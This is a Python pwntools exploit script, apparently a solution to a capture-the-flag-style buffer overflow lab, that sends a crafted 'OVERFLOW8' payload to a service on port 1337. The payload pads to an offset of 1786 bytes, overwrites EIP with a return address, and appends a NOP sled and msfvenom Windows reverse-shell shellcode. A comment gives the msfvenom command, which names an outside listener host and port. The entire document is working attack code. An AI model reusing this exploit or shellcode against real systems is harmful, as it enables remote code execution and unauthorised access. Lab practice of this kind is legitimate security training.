#!/usr/bin/env python3

from pwn import *

host = "10.10.4.173"
port = 1337
s = remote(host, port)

total_length = 2000
offset = 1786
new_eip = p32(0x62501203)
nop = b"\x90" * 5
buf =  b""
buf += b"\xb8\x41\x42\xfe\xe7\xdd\xc1\xd9\x74\x24\xf4\x5a\x33"
buf += b"\xc9\xb1\x52\x31\x42\x12\x03\x42\x12\x83\xab\xbe\x1c"
buf += b"\x12\xd7\xd7\x63\xdd\x27\x28\x04\x57\xc2\x19\x04\x03"
buf += b"\x87\x0a\xb4\x47\xc5\xa6\x3f\x05\xfd\x3d\x4d\x82\xf2"
buf += b"\xf6\xf8\xf4\x3d\x06\x50\xc4\x5c\x84\xab\x19\xbe\xb5"
buf += b"\x63\x6c\xbf\xf2\x9e\x9d\xed\xab\xd5\x30\x01\xdf\xa0"
buf += b"\x88\xaa\x93\x25\x89\x4f\x63\x47\xb8\xde\xff\x1e\x1a"
buf += b"\xe1\x2c\x2b\x13\xf9\x31\x16\xed\x72\x81\xec\xec\x52"
buf += b"\xdb\x0d\x42\x9b\xd3\xff\x9a\xdc\xd4\x1f\xe9\x14\x27"
buf += b"\x9d\xea\xe3\x55\x79\x7e\xf7\xfe\x0a\xd8\xd3\xff\xdf"
buf += b"\xbf\x90\x0c\xab\xb4\xfe\x10\x2a\x18\x75\x2c\xa7\x9f"
buf += b"\x59\xa4\xf3\xbb\x7d\xec\xa0\xa2\x24\x48\x06\xda\x36"
buf += b"\x33\xf7\x7e\x3d\xde\xec\xf2\x1c\xb7\xc1\x3e\x9e\x47"
buf += b"\x4e\x48\xed\x75\xd1\xe2\x79\x36\x9a\x2c\x7e\x39\xb1"
buf += b"\x89\x10\xc4\x3a\xea\x39\x03\x6e\xba\x51\xa2\x0f\x51"
buf += b"\xa1\x4b\xda\xf6\xf1\xe3\xb5\xb6\xa1\x43\x66\x5f\xab"
buf += b"\x4b\x59\x7f\xd4\x81\xf2\xea\x2f\x42\xf7\xfb\x24\x8e"
buf += b"\x6f\xfe\x3a\x8d\x46\x77\xdc\xbb\x88\xd1\x77\x54\x30"
buf += b"\x78\x03\xc5\xbd\x56\x6e\xc5\x36\x55\x8f\x88\xbe\x10"
buf += b"\x83\x7d\x4f\x6f\xf9\x28\x50\x45\x95\xb7\xc3\x02\x65"
buf += b"\xb1\xff\x9c\x32\x96\xce\xd4\xd6\x0a\x68\x4f\xc4\xd6"
buf += b"\xec\xa8\x4c\x0d\xcd\x37\x4d\xc0\x69\x1c\x5d\x1c\x71"
buf += b"\x18\x09\xf0\x24\xf6\xe7\xb6\x9e\xb8\x51\x61\x4c\x13"
buf += b"\x35\xf4\xbe\xa4\x43\xf9\xea\x52\xab\x48\x43\x23\xd4"
buf += b"\x65\x03\xa3\xad\x9b\xb3\x4c\x64\x18\xc3\x06\x24\x09"
buf += b"\x4c\xcf\xbd\x0b\x11\xf0\x68\x4f\x2c\x73\x98\x30\xcb"
buf += b"\x6b\xe9\x35\x97\x2b\x02\x44\x88\xd9\x24\xfb\xa9\xcb"
shellcode = buf			#msfvenom -p windows/shell_reverse_tcp LHOST=10.17.11.28 LPORT=9001 -b "\x00\x1d\x2e\xc7\xee" -f py

payload = [
    b"OVERFLOW8 ",
    b"A" * offset,
    new_eip,
    nop,
    shellcode,
    b"C" * (total_length - offset - len(new_eip) - len(shellcode)),
]

payload = b"".join(payload)
s.send(payload)
s.close()